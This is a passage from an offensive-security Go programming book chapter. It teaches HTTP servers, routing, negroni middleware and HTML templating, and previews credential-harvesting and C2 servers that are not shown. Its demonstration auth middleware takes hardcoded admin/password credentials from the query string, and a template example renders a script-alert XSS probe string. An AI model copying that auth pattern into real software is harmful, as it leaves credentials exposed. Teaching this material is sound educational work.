<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch4"><span epub:type="pagebreak" id="page_77"/><span class="big">4</span><br/>HTTP SERVERS, ROUTING, AND MIDDLEWARE</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">If you know how to write HTTP servers from scratch, you can create customized logic for social engineering, command-and-control (C2) transports, or APIs and frontends for your own tools, among other things. Luckily, Go has a brilliant standard package—<span class="literal">net/http</span>—for building HTTP servers; it’s really all you need to effectively write not only simple servers, but also complex, full-featured web applications.</p>&#13;
<p class="indent">In addition to the standard package, you can leverage third-party packages to speed up development and remove some of the tedious processes, such as pattern matching. These packages will assist you with routing, building middleware, validating requests, and other tasks.</p>&#13;
<p class="indent">In this chapter, you’ll first explore many of the techniques needed to build HTTP servers using simple applications. Then you’ll deploy these techniques to create two social engineering applications—a credential-harvesting server and a keylogging server—and multiplex C2 channels.</p>&#13;
<h3 class="h3" id="ch4lev1sec1"><span epub:type="pagebreak" id="page_78"/>HTTP Server Basics</h3>&#13;
<p class="noindent">In this section, you’ll explore the <span class="literal">net/http</span> package and useful third-party packages by building simple servers, routers, and middleware. We’ll expand on these basics to cover more nefarious examples later in the chapter.</p>&#13;
<h4 class="h4" id="ch4lev2sec1">Building a Simple Server</h4>&#13;
<p class="noindent">The code in <a href="ch04.xhtml#ch4list1">Listing 4-1</a> starts a server that handles requests to a single path. (All the code listings at the root location of / exist under the provided github repo <em><a href="https://github.com/blackhat-go/bhg/">https://github.com/blackhat-go/bhg/</a></em>.) The server should locate the <span class="literal">name</span> URL parameter containing a user’s name and respond with a customized greeting.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
    "net/http"&#13;
)&#13;
&#13;
func hello(w http.ResponseWriter, r *http.Request) {&#13;
    fmt.Fprintf(w, "Hello %s\n", r.URL.Query().Get("name"))&#13;
}&#13;
&#13;
func main() {&#13;
 <span class="ent">❶</span> http.HandleFunc("/hello", hello)&#13;
 <span class="ent">❷</span> http.ListenAndServe(":8000", nil)&#13;
}</pre>&#13;
<p class="caption" id="ch4list1"><em>Listing 4-1: A Hello World server (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/hello_world/main.go">/ch-4/hello_world/main.go</a><em>)</em></p>&#13;
<p class="indent">This simple example exposes a resource at <span class="literal">/hello</span>. The resource grabs the parameter and echoes its value back to the client. Within the <span class="literal">main()</span> function, <span class="literal">http.HandleFunc()</span> <span class="ent">❶</span> takes two arguments: a string, which is a URL path pattern you’re instructing your server to look for, and a function, which will actually handle the request. You could provide the function definition as an anonymous inline function, if you want. In this example, you pass in the function named <span class="literal">hello()</span> that you defined earlier.</p>&#13;
<p class="indent">The <span class="literal">hello()</span> function handles requests and returns a hello message to the client. It takes two arguments itself. The first is <span class="literal">http.ResponseWriter</span>, which is used to write responses to the request. The second argument is a pointer to <span class="literal">http.Request</span>, which will allow you to read information from the incoming request. Note that you aren’t calling your <span class="literal">hello()</span> function from <span class="literal">main()</span>. You’re simply telling your HTTP server that any requests for <span class="literal">/hello</span> should be handled by a function named <span class="literal">hello()</span>.</p>&#13;
<p class="indent">Under the covers, what does <span class="literal">http.HandleFunc()</span> actually do? The Go documentation will tell you that it places the handler on the <span class="literal">DefaultServerMux</span>. A <span class="literal">ServerMux</span> is short for a <em>server multiplexer</em>, which is just a fancy way to say that the underlying code can handle multiple HTTP requests for patterns and functions. It does this using goroutines, with one goroutine per incoming <span epub:type="pagebreak" id="page_79"/>request. Importing the <span class="literal">net/http</span> package creates a <span class="literal">ServerMux</span> and attaches it to that package’s namespace; this is the <span class="literal">DefaultServerMux</span>.</p>&#13;
<p class="indent">The next line is a call to <span class="literal">http.ListenAndServe()</span> <span class="ent">❷</span>, which takes a string and an <span class="literal">http.Handler</span> as arguments. This starts an HTTP server by using the first argument as the address. In this case, that’s <span class="literal">:8000</span>, which means the server should listen on port 8000 across all interfaces. For the second argument, the <span class="literal">http.Handler</span>, you pass in <span class="literal">nil</span>. As a result, the package uses <span class="literal">DefaultServerMux</span> as the underlying handler. Soon, you’ll be implementing your own <span class="literal">http.Handler</span> and will pass that in, but for now you’ll just use the default. You could also use <span class="literal">http.ListenAndServeTLS()</span>, which will start a server using HTTPS and TLS, as the name describes, but requires additional parameters.</p>&#13;
<p class="indent">Implementing the <span class="literal">http.Handler</span> interface requires a single method: <span class="literal">ServeHTTP(http.ResponseWriter, *http.Request)</span>. This is great because it simplifies the creation of your own custom HTTP servers. You’ll find numerous third-party implementations that extend the <span class="literal">net/http</span> functionality to add features such as middleware, authentication, response encoding, and more.</p>&#13;
<p class="indent">You can test this server by using <span class="literal">curl</span>:</p>&#13;
<pre>$ <span class="codestrong1">curl -i http://localhost:8000/hello?name=alice</span>&#13;
HTTP/1.1 200 OK&#13;
Date: Sun, 12 Jan 2020 01:18:26 GMT&#13;
Content-Length: 12&#13;
Content-Type: text/plain; charset=utf-8&#13;
&#13;
Hello alice</pre>&#13;
<p class="indent">Excellent! The server you built reads the <span class="literal">name</span> URL parameter and replies with a greeting.</p>&#13;
<h4 class="h4" id="ch4lev2sec2">Building a Simple Router</h4>&#13;
<p class="noindent">Next you’ll build a simple router, shown in <a href="ch04.xhtml#ch4list2">Listing 4-2</a>, that demonstrates how to dynamically handle inbound requests by inspecting the URL path. Depending on whether the URL contains the path <span class="literal">/a</span>, <span class="literal">/b</span>, or <span class="literal">/c</span>, you’ll print either the message <span class="literal">Executing /a</span>, <span class="literal">Executing /b</span>, or <span class="literal">Executing /c</span>. You’ll print a <span class="literal">404 Not Found</span> error for everything else.</p>&#13;
<pre>   package main&#13;
&#13;
   import (&#13;
       "fmt"&#13;
       "net/http"&#13;
   )&#13;
&#13;
<span class="ent">❶</span> type router struct {&#13;
   }&#13;
&#13;
<span class="ent">❷</span> func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {&#13;
    <span class="ent">❸</span> switch req.URL.Path {&#13;
       case "/a":&#13;
           fmt.Fprint(w, "Executing /a")&#13;
<span epub:type="pagebreak" id="page_80"/>       case "/b":&#13;
           fmt.Fprint(w, "Executing /b")&#13;
       case "/c":&#13;
           fmt.Fprint(w, "Executing /c")&#13;
       default:&#13;
           http.Error(w, "404 Not Found", 404)&#13;
       }&#13;
   }&#13;
&#13;
   func main() {&#13;
       var r router&#13;
    <span class="ent">❹</span> http.ListenAndServe(":8000", &amp;r)&#13;
   }</pre>&#13;
<p class="caption" id="ch4list2"><em>Listing 4-2: A simple router (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/simple_router/main.go">/ch-4/simple_router/main.go</a><em>)</em></p>&#13;
<p class="indent">First, you define a new type named <span class="literal">router</span> without any fields <span class="ent">❶</span>. You’ll use this to implement the <span class="literal">http.Handler</span> interface. To do this, you must define the <span class="literal">ServeHTTP()</span> method <span class="ent">❷</span>. The method uses a <span class="literal">switch</span> statement on the request’s URL path <span class="ent">❸</span>, executing different logic depending on the path. It uses a default <span class="literal">404 Not Found</span> response action. In <span class="literal">main()</span>, you create a new <span class="literal">router</span> and pass its respective pointer to <span class="literal">http.ListenAndServe()</span> <span class="ent">❹</span>.</p>&#13;
<p class="indent">Let’s take this for a spin in the ole terminal:</p>&#13;
<pre>$ <span class="codestrong1">curl http://localhost:8000/a</span>&#13;
Executing /a&#13;
$ <span class="codestrong1">curl http://localhost:8000/d</span>&#13;
404 Not Found</pre>&#13;
<p class="indent">Everything works as expected; the program returns the message <span class="literal">Executing</span> <span class="literal">/a</span> for a URL that contains the <span class="literal">/a</span> path, and it returns a 404 response on a path that doesn’t exist. This is a trivial example. The third-party routers that you’ll use will have much more complex logic, but this should give you a basic idea of how they work.</p>&#13;
<h4 class="h4" id="ch4lev2sec3">Building Simple Middleware</h4>&#13;
<p class="noindent">Now let’s build <em>middleware</em>, which is a sort of wrapper that will execute on all incoming requests regardless of the destination function. In the example in <a href="ch04.xhtml#ch4list3">Listing 4-3</a>, you’ll create a logger that displays the request’s processing start and stop time.</p>&#13;
<pre>   Package main&#13;
&#13;
   import (&#13;
           "fmt"&#13;
           "log"&#13;
           "net/http"&#13;
           "time"&#13;
   )&#13;
&#13;
<span epub:type="pagebreak" id="page_81"/><span class="ent">❶</span> type logger struct {&#13;
           Inner http.Handler&#13;
   }&#13;
&#13;
<span class="ent">❷</span> func (l *logger) ServeHTTP(w http.ResponseWriter, r *http.Request) {&#13;
           log.Println("start")&#13;
        <span class="ent">❸</span> l.Inner.ServeHTTP(w, r)&#13;
           log.Println("finish")&#13;
   }&#13;
&#13;
   func hello(w http.ResponseWriter, r *http.Request) {&#13;
           fmt.Fprint(w, "Hello\n")&#13;
   }&#13;
&#13;
   func main() {&#13;
        <span class="ent">❹</span> f := http.HandlerFunc(hello)&#13;
        <span class="ent">❺</span> l := logger{Inner: f}&#13;
        <span class="ent">❻</span> http.ListenAndServe(":8000", &amp;l)&#13;
   }</pre>&#13;
<p class="caption" id="ch4list3"><em>Listing 4-3: Simple middleware (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/simple_middleware/main.go">/ch-4/simple_middleware/main.go</a><em>)</em></p>&#13;
<p class="indent">What you’re essentially doing is creating an outer handler that, on every request, logs some information on the server and calls your <span class="literal">hello()</span> function. You wrap this logging logic around your function.</p>&#13;
<p class="indent">As with the routing example, you define a new type named <span class="literal">logger</span>, but this time you have a field, <span class="literal">Inner</span>, which is an <span class="literal">http.Handler</span> itself <span class="ent">❶</span>. In your <span class="literal">ServeHTTP()</span> definition <span class="ent">❷</span>, you use <span class="literal">log()</span> to print the start and finish times of the request, calling the inner handler’s <span class="literal">ServeHTTP()</span> method in between <span class="ent">❸</span>. To the client, the request will finish inside the inner handler. Inside <span class="literal">main()</span>, you use <span class="literal">http.HandlerFunc()</span> to create an <span class="literal">http.Handler</span> out of a function <span class="ent">❹</span>. You create the <span class="literal">logger</span>, setting <span class="literal">Inner</span> to your newly created handler <span class="ent">❺</span>. Finally, you start the server by using a pointer to a <span class="literal">logger</span> instance <span class="ent">❻</span>.</p>&#13;
<p class="indent">Running this and issuing a request outputs two messages containing the start and finish times of the request:</p>&#13;
<pre>$ <span class="codestrong1">go build -o simple_middleware</span>&#13;
$ <span class="codestrong1">./simple_middleware</span>&#13;
2020/01/16 06:23:14 start&#13;
2020/01/16 06:23:14 finish</pre>&#13;
<p class="indent">In the following sections, we’ll dig deeper into middleware and routing and use some of our favorite third-party packages, which let you create more dynamic routes and execute middleware inside a chain. We’ll also discuss some use cases for middleware that move into more complex scenarios.</p>&#13;
<h4 class="h4" id="ch4lev2sec4">Routing with the gorilla/mux Package</h4>&#13;
<p class="noindent">As shown in <a href="ch04.xhtml#ch4list2">Listing 4-2</a>, you can use routing to match a request’s path to a function. But you can also use it to match other properties—such as the HTTP verb or host header—to a function. Several third-party routers are <span epub:type="pagebreak" id="page_82"/>available in the Go ecosystem. Here, we’ll introduce you to one of them: the <span class="literal">gorilla/mux</span> package. But just as with everything, we encourage you to expand your knowledge by researching additional packages as you encounter them.</p>&#13;
<p class="indent">The <span class="literal">gorilla/mux</span> package is a mature, third-party routing package that allows you to route based on both simple and complex patterns. It includes regular expressions, parameter matching, verb matching, and sub routing, among other features.</p>&#13;
<p class="indent">Let’s go over a few examples of how you might use the router. There is no need to run these, as you’ll be using them in a real program soon, but please feel free to play around and experiment.</p>&#13;
<p class="indent">Before you can use <span class="literal">gorilla/mux</span>, you must <span class="literal">go get</span> it:</p>&#13;
<pre>$ <span class="codestrong1">go get github.com/gorilla/mux</span></pre>&#13;
<p class="indent">Now, you can start routing. Create your router by using <span class="literal">mux.NewRouter()</span>:</p>&#13;
<pre>r := mux.NewRouter()</pre>&#13;
<p class="indent">The returned type implements <span class="literal">http.Handler</span> but has a host of other associated methods as well. The one you’ll use most often is <span class="literal">HandleFunc()</span>. For example, if you wanted to define a new route to handle GET requests to the pattern <span class="literal">/foo</span>, you could use this:</p>&#13;
<pre>r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {&#13;
    fmt.Fprint(w, "hi foo")&#13;
}).Methods("GET")<span class="ent">❶</span></pre>&#13;
<p class="indent">Now, because of the call to <span class="literal">Methods()</span> <span class="ent">❶</span>, only GET requests will match this route. All other methods will return a 404 response. You can chain other qualifiers on top of this, such as <span class="literal">Host(string)</span>, which matches a particular host header value. For example, the following will match only requests whose host header is set to <em>www.foo.com</em>:</p>&#13;
<pre>r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {&#13;
    fmt.Fprint(w, "hi foo")&#13;
}).Methods("GET").Host("www.foo.com")</pre>&#13;
<p class="indent">Sometimes it’s helpful to match and pass in parameters within the request path (for example, when implementing a RESTful API). This is simple with <span class="literal">gorilla/mux</span>. The following will print out anything following <span class="literal">/users/</span> in the request’s path:</p>&#13;
<pre>r.HandleFunc("/users/{user}", func(w http.ResponseWriter, req *http.Request) {&#13;
    user := mux.Vars(req)["user"]&#13;
    fmt.Fprintf(w, "hi %s\n", user)&#13;
}).Methods("GET")</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_83"/>In the path definition, you use braces to define a request parameter. Think of this as a named placeholder. Then, inside the handler function, you call <span class="literal">mux.Vars()</span>, passing it the request object, which returns a <span class="literal">map[string]</span><span class="literal">string</span>—a map of request parameter names to their respective values. You provide the named placeholder <span class="literal">user</span> as the key. So, a request to <span class="literal">/users/bob</span> should produce a greeting for Bob:</p>&#13;
<pre>$ <span class="codestrong1">curl http://localhost:8000/users/bob</span>&#13;
hi bob</pre>&#13;
<p class="indent">You can take this a step further and use a regular expression to qualify the patterns passed. For example, you can specify that the <span class="literal">user</span> parameter must be lowercase letters:</p>&#13;
<pre>r.HandleFunc("/users/{user:[a-z]+}", func(w http.ResponseWriter, req *http.Request) {&#13;
    user := mux.Vars(req)["user"]&#13;
    fmt.Fprintf(w, "hi %s\n", user)&#13;
}).Methods("GET")</pre>&#13;
<p class="indent">Any requests that don’t match this pattern will now return a 404 response:</p>&#13;
<pre>$ <span class="codestrong1">curl -i http://localhost:8000/users/bob1</span>&#13;
HTTP/1.1 404 Not Found</pre>&#13;
<p class="indent">In the next section, we’ll expand on routing to include some middleware implementations using other libraries. This will give you increased flexibility with handling HTTP requests.</p>&#13;
<h4 class="h4" id="ch4lev2sec5">Building Middleware with Negroni</h4>&#13;
<p class="noindent">The simple middleware we showed earlier logged the start and end times of the handling of the request and returned the response. Middleware doesn’t have to operate on every incoming request, but most of the time that will be the case. There are many reasons to use middleware, including logging requests, authenticating and authorizing users, and mapping resources.</p>&#13;
<p class="indent">For example, you could write middleware for performing basic authentication. It could parse an authorization header for each request, validate the username and password provided, and return a 401 response if the credentials are invalid. You could also chain multiple middleware functions together in such a way that after one is executed, the next one defined is run.</p>&#13;
<p class="indent">For the logging middleware you created earlier in this chapter, you wrapped only a single function. In practice, this is not very useful, because you’ll want to use more than one, and to do this, you must have logic that can execute them in a chain, one after another. Writing this from scratch is not incredibly difficult, but let’s not re-create the wheel. Here, you’ll use a mature package that is already able to do this: <span class="literal">negroni</span>.</p>&#13;
<p class="indent">The <span class="literal">negroni</span> package, which you can find at <a href="https://github.com/urfave/negroni/"><em>https://github.com/urfave/negroni/</em></a>, is great because it doesn’t tie you into a larger framework. You can easily bolt it onto other frameworks, and it provides a lot of flexibility. <span epub:type="pagebreak" id="page_84"/>It also comes with default middleware that is useful for many applications. Before you hop in, you need to <span class="literal">go get negroni</span>:</p>&#13;
<pre>$ <span class="codestrong1">go get github.com/urfave/negroni</span></pre>&#13;
<p class="indent">While you technically could use <span class="literal">negroni</span> for all application logic, doing this is far from ideal because it’s purpose-built to act as middleware and doesn’t include a router. Instead, it’s best to use <span class="literal">negroni</span> in combination with another package, such as <span class="literal">gorilla/mux</span> or <span class="literal">net/http</span>. Let’s use <span class="literal">gorilla/mux</span> to build a program that will get you acquainted with <span class="literal">negroni</span> and allow you to visualize the order of operations as they traverse the middleware chain.</p>&#13;
<p class="indent">Start by creating a new file called <em>main.go</em> within a directory namespace, such as <em><a href="http://github.com/blackhat-go/bhg/ch-4/negroni_example/">github.com/blackhat-go/bhg/ch-4/negroni_example/</a></em>. (This namespace will already be created in the event you cloned the BHG Github repository.) Now modify your <em>main.go</em> file to include the following code.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "net/http"&#13;
&#13;
    "github.com/gorilla/mux"&#13;
    "github.com/urfave/negroni"&#13;
)&#13;
&#13;
func main() {&#13;
 <span class="ent">❶</span> r := mux.NewRouter()&#13;
 <span class="ent">❷</span> n := negroni.Classic()&#13;
 <span class="ent">❸</span> n.UseHandler(r)&#13;
    http.ListenAndServe(":8000", n)&#13;
}</pre>&#13;
<p class="caption" id="ch4list4"><em>Listing 4-4: Negroni example (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/negroni_example/main.go">/ch-4/negroni_example/main.go</a><em>)</em></p>&#13;
<p class="indent">First, you create a router as you did earlier in this chapter by calling <span class="literal">mux.NewRouter()</span> <span class="ent">❶</span>. Next comes your first interaction with the <span class="literal">negroni</span> package: you make a call to <span class="literal">negroni.Classic()</span> <span class="ent">❷</span>. This creates a new pointer to a <span class="literal">Negroni</span> instance.</p>&#13;
<p class="indent">There are different ways to do this. You can either use <span class="literal">negroni.Classic()</span> or call <span class="literal">negroni.New()</span>. The first, <span class="literal">negroni.Classic()</span>, sets up default middleware, including a request logger, recovery middleware that will intercept and recover from panics, and middleware that will serve files from the public folder in the same directory. The <span class="literal">negroni.New()</span> function doesn’t create any default middleware.</p>&#13;
<p class="indent">Each type of middleware is available in the <span class="literal">negroni</span> package. For example, you can use the recovery package by doing the following:</p>&#13;
<pre>n.Use(negroni.NewRecovery())</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_85"/>Next, you add your router to the middleware stack by calling <span class="literal">n.Use</span><span class="literal">Handler(r)</span> <span class="ent">❸</span>. As you continue to plan and build out your middleware, consider the order of execution. For example, you’ll want your authentication-checking middleware to run prior to the handler functions that require authentication. Any middleware mounted before the router will execute prior to your handler functions; any middleware mounted after the router will execute after your handler functions. Order matters. In this case, you haven’t defined any custom middleware, but you will soon.</p>&#13;
<p class="indent">Go ahead and build the server you created in <a href="ch04.xhtml#ch4list4">Listing 4-4</a>, and then execute it. Then issue web requests to the server at <em>http://localhost:8000</em>. You should see the <span class="literal">negroni</span> logging middleware print information to stdout, as shown next. The output shows the timestamp, response code, processing time, host, and HTTP method:</p>&#13;
<pre>$ <span class="codestrong1">go build -s negroni_example</span>&#13;
$ <span class="codestrong1">./negroni_example</span>&#13;
 [negroni] 2020-01-19T11:49:33-07:00 | 404 |      1.0002ms | localhost:8000 | GET</pre>&#13;
<p class="indent">Having default middleware is great and all, but the real power comes when you create your own. With <span class="literal">negroni</span>, you can use a few methods to add middleware to the stack. Take a look at the following code. It creates trivial middleware that prints a message and passes execution to the next middleware in the chain:</p>&#13;
<pre>type trivial struct {&#13;
}&#13;
func (t *trivial) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) { <span class="ent">❶</span>&#13;
    fmt.Println("Executing trivial middleware")&#13;
    next(w, r) <span class="ent">❷</span>&#13;
}</pre>&#13;
<p class="indent">This implementation is slightly different from previous examples. Before, you were implementing the <span class="literal">http.Handler</span> interface, which expected a <span class="literal">ServeHTTP()</span> method that accepted two parameters: <span class="literal">http.ResponseWriter</span> and <span class="literal">*http.Request</span>. In this new example, instead of the <span class="literal">http.Handler</span> interface, you’re implementing the <span class="literal">negroni.Handler</span> interface.</p>&#13;
<p class="indent">The slight difference is that the <span class="literal">negroni.Handler</span> interface expects you to implement a <span class="literal">ServeHTTP()</span> method that accepts not two, but three, parameters: <span class="literal">http.ResponseWriter</span>, <span class="literal">*http.Request</span>, and <span class="literal">http.HandlerFunc</span> <span class="ent">❶</span>. The <span class="literal">http.HandlerFunc</span> parameter represents the next middleware function in the chain. For your purposes, you name it <span class="literal">next</span>. You do your processing within <span class="literal">ServeHTTP()</span>, and then call <span class="literal">next()</span> <span class="ent">❷</span>, passing it the <span class="literal">http.ResponseWriter</span> and <span class="literal">*http.Request</span> values you originally received. This effectively transfers execution down the chain.</p>&#13;
<p class="indent">But you still have to tell <span class="literal">negroni</span> to use your implementation as part of the middleware chain. You can do this by calling <span class="literal">negroni</span>’s <span class="literal">Use</span> method and passing an instance of your <span class="literal">negroni.Handler</span> implementation to it:</p>&#13;
<pre>n.Use(&amp;trivial{})</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_86"/>Writing your middleware by using this method is convenient because you can easily pass execution to the next middleware. There is one drawback: anything you write must use <span class="literal">negroni</span>. For example, if you were writing a middleware package that writes security headers to a response, you would want it to implement <span class="literal">http.Handler</span>, so you could use it in other application stacks, since most stacks won’t expect a <span class="literal">negroni.Handler</span>. The point is, regardless of your middleware’s purpose, compatibility issues may arise when trying to use <span class="literal">negroni</span> middleware in a non-<span class="literal">negroni</span> stack, and vice versa.</p>&#13;
<p class="indent">There are two other ways to tell <span class="literal">negroni</span> to use your middleware. <span class="literal">UseHandler</span><span class="literal">(handler http.Handler)</span>, which you’re already familiar with, is the first. The second way is to call <span class="literal">UseHandleFunc(handlerFunc func(w http.ResponseWriter,</span> <span class="literal">r *http.Request))</span>. The latter is not something you’ll want to use often, since it doesn’t let you forgo execution of the next middleware in the chain. For example, if you were writing middleware to perform authentication, you would want to return a 401 response and stop execution if any credentials or session information were invalid; with this method, there’s no way to do that.</p>&#13;
<h4 class="h4" id="ch4lev2sec6">Adding Authentication with Negroni</h4>&#13;
<p class="noindent">Before moving on, let’s modify our example from the previous section to demonstrate the use of <span class="literal">context</span>, which can easily pass variables between functions. The example in <a href="ch04.xhtml#ch4list5">Listing 4-5</a> uses <span class="literal">negroni</span> to add authentication middleware.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "context"&#13;
    "fmt"&#13;
    "net/http"&#13;
&#13;
    "github.com/gorilla/mux"&#13;
    "github.com/urfave/negroni"&#13;
)&#13;
&#13;
type badAuth struct { <span class="ent">❶</span>&#13;
    Username string&#13;
    Password string&#13;
}&#13;
&#13;
func (b *badAuth) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) { <span class="ent">❷</span>&#13;
    username := r.URL.Query().Get("username") <span class="ent">❸</span>&#13;
    password := r.URL.Query().Get("password")&#13;
    if username != b.Username || password != b.Password {&#13;
        http.Error(w, "Unauthorized", 401)&#13;
        return <span class="ent">❹</span>&#13;
    }&#13;
    ctx := context.WithValue(r.Context(), "username", username) <span class="ent">❺</span>&#13;
    r = r.WithContext(ctx) <span class="ent">❻</span>&#13;
    next(w, r)&#13;
}&#13;
&#13;
<span epub:type="pagebreak" id="page_87"/>func hello(w http.ResponseWriter, r *http.Request) {&#13;
    username := r.Context().Value("username").(string) <span class="ent">❼</span>&#13;
    fmt.Fprintf(w, "Hi %s\n", username)&#13;
}&#13;
&#13;
func main() {&#13;
    r := mux.NewRouter()&#13;
    r.HandleFunc("/hello", hello).Methods("GET")&#13;
    n := negroni.Classic()&#13;
    n.Use(&amp;badAuth{&#13;
        Username: "admin",&#13;
        Password: "password",&#13;
    })&#13;
    n.UseHandler(r)&#13;
    http.ListenAndServe(":8000", n)&#13;
}</pre>&#13;
<p class="caption" id="ch4list5"><em>Listing 4-5: Using context in handlers (</em>/<a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/negroni_example/main.go">ch-4/negroni_example/main.go</a><em>)</em></p>&#13;
<p class="indent">You’ve added new middleware, <span class="literal">badAuth</span>, that is going to simulate authentication, purely for demonstration purposes <span class="ent">❶</span>. This new type has two fields, <span class="literal">Username</span> and <span class="literal">Password</span>, and implements <span class="literal">negroni.Handler</span>, since it defines the three-parameter version of the <span class="literal">ServeHTTP()</span> method <span class="ent">❷</span> we discussed previously. Inside the <span class="literal">ServeHTTP()</span> method, you first grab the username and password from the request <span class="ent">❸</span>, and then compare them to the fields you have. If the username and password are incorrect, execution is stopped, and a 401 response is written to the requester.</p>&#13;
<p class="indent">Notice that you return <span class="ent">❹</span> before calling <span class="literal">next()</span>. This prevents the remainder of the middleware chain from executing. If the credentials are correct, you go through a rather verbose routine of adding the username to the request context. You first call <span class="literal">context.WithValue()</span> to initialize the context from the request, setting a variable named <span class="literal">username</span> on that context <span class="ent">❺</span>. You then make sure the request uses your new context by calling <span class="literal">r.WithContext(ctx)</span> <span class="ent">❻</span>. If you plan on writing web applications with Go, you’ll want to become familiar with this pattern, as you’ll be using it a lot.</p>&#13;
<p class="indent">In the <span class="literal">hello()</span> function, you get the username from the request context by using the <span class="literal">Context().Value(interface{})</span> function, which itself returns an <span class="literal">interface{}</span>. Because you know it’s a string, you can use a type assertion here <span class="ent">❼</span>. If you can’t guarantee the type, or you can’t guarantee that the value will exist in the context, use a <span class="literal">switch</span> routine for conversion.</p>&#13;
<p class="indent">Build and execute the code from <a href="ch04.xhtml#ch4list5">Listing 4-5</a> and send a few requests to the server. Send some with both correct and incorrect credentials. You should see the following output:</p>&#13;
<pre>$ <span class="codestrong1">curl -i http://localhost:8000/hello</span>&#13;
HTTP/1.1 401 Unauthorized&#13;
Content-Type: text/plain; charset=utf-8&#13;
X-Content-Type-Options: nosniff&#13;
Date: Thu, 16 Jan 2020 20:41:20 GMT&#13;
Content-Length: 13&#13;
<span epub:type="pagebreak" id="page_88"/>Unauthorized&#13;
$ <span class="codestrong1">curl -i 'http://localhost:8000/hello?username=admin&amp;password=password'</span>&#13;
HTTP/1.1 200 OK&#13;
Date: Thu, 16 Jan 2020 20:41:05 GMT&#13;
Content-Length: 9&#13;
Content-Type: text/plain; charset=utf-8&#13;
&#13;
Hi admin</pre>&#13;
<p class="indent">Making a request without credentials results in your middleware returning a 401 Unauthorized error. Sending the same request with a valid set of credentials produces a super-secret greeting message accessible only to authenticated users.</p>&#13;
<p class="indent">That was an awful lot to digest. Up to this point, your handler functions have solely used <span class="literal">fmt.FPrintf()</span> to write your response to the <span class="literal">http.ResponseWriter</span> instance. In the next section, you’ll look at a more dynamic way of returning HTML by using Go’s templating package.</p>&#13;
<h4 class="h4" id="ch4lev2sec7">Using Templates to Produce HTML Responses</h4>&#13;
<p class="noindent"><em>Templates</em> allow you to dynamically generate content, including HTML, with variables from Go programs. Many languages have third-party packages that allow you to generate templates. Go has two templating packages, <span class="literal">text/template</span> and <span class="literal">html/template</span>. In this chapter, you’ll use the HTML package, because it provides the contextual encoding you need.</p>&#13;
<p class="indent">One of the fantastic things about Go’s package is that it’s contextually aware: it will encode your variable differently depending on where the variable is placed in the template. For example, if you were to supply a string as a URL to an <span class="literal">href</span> attribute, the string would be URL encoded, but the same string would be HTML encoded if it rendered within an HTML element.</p>&#13;
<p class="indent">To create and use templates, you first define your template, which contains a placeholder to denote the dynamic contextual data to render. Its syntax should look familiar to readers who have used Jinja with Python. When you render the template, you pass to it a variable that’ll be used as this context. The variable can be a complex structure with several fields, or it can be a primitive variable.</p>&#13;
<p class="indent">Let’s work through a sample, shown in <a href="ch04.xhtml#ch4list6">Listing 4-6</a>, that creates a simple template and populates a placeholder with JavaScript. This is a contrived example that shows how to dynamically populate content returned to the browser.</p>&#13;
<pre>   package main&#13;
&#13;
   import (&#13;
       "html/template"&#13;
       "os"&#13;
   )&#13;
&#13;
<span class="ent">❶</span> var x = `&#13;
   &lt;html&gt;&#13;
     &lt;body&gt;&#13;
&#13;
<span epub:type="pagebreak" id="page_89"/>    <span class="ent">❷</span> Hello {{.}}&#13;
     &lt;/body&gt;&#13;
   &lt;/html&gt;&#13;
   `&#13;
&#13;
   func main() {&#13;
    <span class="ent">❸</span> t, err := template.New("hello").Parse(x)&#13;
       if err != nil {&#13;
           panic(err)&#13;
       }&#13;
    <span class="ent">❹</span> t.Execute(os.Stdout, "&lt;script&gt;alert('world')&lt;/script&gt;")&#13;
   }</pre>&#13;
<p class="caption" id="ch4list6"><em>Listing 4-6: HTML templating (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/template_example/main.go">/ch-4/template_example/main.go</a><em>)</em></p>&#13;
<p class="indent">The first thing you do is create a variable, named <span class="literal">x</span>, to store your HTML template <span class="ent">❶</span>. Here you’re using a string embedded in your code to define your template, but most of the time you’ll want to store your templates as separate files. Notice that the template is nothing more than a simple HTML page. Inside the template, you define placeholders by using the <span class="literal">{{</span><span class="codeitalic">variable-name</span><span class="literal">}}</span> convention, where <span class="codeitalic">variable-name</span> is the data element within your contextual data that you’ll want to render <span class="ent">❷</span>. Recall that this can be a struct or another primitive. In this case, you’re using a single period, which tells the package that you want to render the entire context here. Since you’ll be working with a single string, this is fine, but if you had a larger and more complex data structure, such as a struct, you could get only the fields you want by calling past this period. For example, if you passed a struct with a <span class="literal">Username</span> field to the template, you could render the field by using <span class="literal">{{.Username}}</span>.</p>&#13;
<p class="indent">Next, in your <span class="literal">main()</span> function, you create a new template by calling <span class="literal">template.New(</span><span class="codeitalic">string</span><span class="literal">)</span> <span class="ent">❸</span>. Then you call <span class="literal">Parse(</span><span class="codeitalic">string</span><span class="literal">)</span> to ensure that the template is properly formatted and to parse it. Together, these two functions return a new pointer to a <span class="literal">Template</span>.</p>&#13;
<p class="indent">While this example uses only a single template, it’s possible to embed templates in other templates. When using multiple templates, it’s important that you name them in order to be able to call them. Finally, you call <span class="literal">Execute(</span><span class="codeitalic">io.Writer</span><span class="literal">,</span> <span class="codeitalic">interface</span><span class="literal">{})</span> <span class="ent">❹</span>, which processes the template by using the variable passed as the second argument and writes it to the provided <span class="literal">io.Writer</span>. For demonstration purposes, you’ll use <span class="literal">os.Stdout</span>. The second variable you pass into the <span class="literal">Execute()</span> method is the context that’ll be used for rendering the template.</p>&#13;
